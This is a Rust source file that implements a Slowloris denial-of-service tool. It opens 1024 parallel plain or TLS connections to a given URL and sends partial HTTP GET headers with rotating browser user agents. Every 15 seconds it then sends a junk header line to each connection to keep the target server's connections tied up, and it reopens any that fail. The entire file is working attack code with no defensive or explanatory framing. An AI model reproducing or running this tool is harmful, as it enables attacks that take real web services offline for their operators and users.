extern crate native_tls;
extern crate url;
extern crate rand;
extern crate rayon;
use url::{Url, ParseError};

use native_tls::{TlsConnector, TlsStream};
use rayon::prelude::*;
use rand::Rng;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use std::thread;
use std::error::Error;
use std::fmt;

#[derive(Debug)]
pub enum LorisError {
    UrlParseError(ParseError),
}

impl From<ParseError> for LorisError {
    fn from(err: ParseError) -> Self {
        LorisError::UrlParseError(err)
    }
}

impl fmt::Display for LorisError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.description())
    }
}

impl Error for LorisError {
    fn description(&self) -> &str {
        match self {
            &LorisError::UrlParseError(ref err) => err.description(),
        }
    }

    fn cause(&self) -> Option<&Error> {
        match self {
            &LorisError::UrlParseError(ref err) => Some(err),
        }
    }
}

enum Stream<S>
where
    S: Read + Write,
{
    Tls(TlsStream<S>),
    Plain(S),
}

impl<S> Read for Stream<S>
where
    S: Read + Write,
{
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.read(buf),
            &mut Stream::Plain(ref mut stream) => stream.read(buf),
        }
    }
}

impl<S> Write for Stream<S>
where
    S: Read + Write,
{
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.write(buf),
            &mut Stream::Plain(ref mut stream) => stream.write(buf),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.flush(),
            &mut Stream::Plain(ref mut stream) => stream.flush(),
        }
    }
}

pub fn do_loris(url: &str) -> Result<(), LorisError> {
    let url = Url::parse(url)?;

    let connection_num = 1024;
    let init_header = get_init_header(&url);
    let mut connections: Vec<_> = (0..connection_num)
        .into_par_iter()
        .map(|_| spawn_connection(&url, &init_header))
        .collect();

    let timeout = 15_000;
    loop {
        println!("Attacking...");
        connections.par_iter_mut().for_each(|connection| {
            let loris_header = get_loris_header();
            let res = connection.write_all(&loris_header);
            if res.is_err() {
                println!("Timeout, reseting connection...");
                let mut new_connection = spawn_connection(&url, &init_header);
                std::mem::swap(connection, &mut new_connection);
            }
        });
        println!("Done!");
        thread::sleep(Duration::from_millis(timeout));
    }
}


fn get_stream(url: &Url) -> Stream<TcpStream> {
    let domain = url.host_str().unwrap();
    let port = url.port_or_known_default().unwrap();
    let stream = TcpStream::connect((domain, port)).unwrap();
    if url.scheme() == "https" {
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        Stream::Tls(connector.connect(domain, stream).unwrap())
    } else {
        Stream::Plain(stream)
    }
}

fn spawn_connection(url: &Url, init_header: &[u8]) -> Stream<TcpStream> {
    let mut stream = get_stream(&url);
    stream.write_all(&init_header).unwrap();
    stream
}

fn get_init_header(url: &Url) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let user_agent = USER_AGENTS[rng.gen_range(0, USER_AGENTS.len())];
    format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n",
        url.path(),
        url.host_str().unwrap(),
        user_agent
    ).as_bytes()
        .to_vec()
}

fn get_loris_header() -> Vec<u8> {
    format!("X-a: {}\r\n", rand::random::<u32>())
        .as_bytes()
        .to_vec()
}

const USER_AGENTS: &'static [&'static str] = &[
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
];
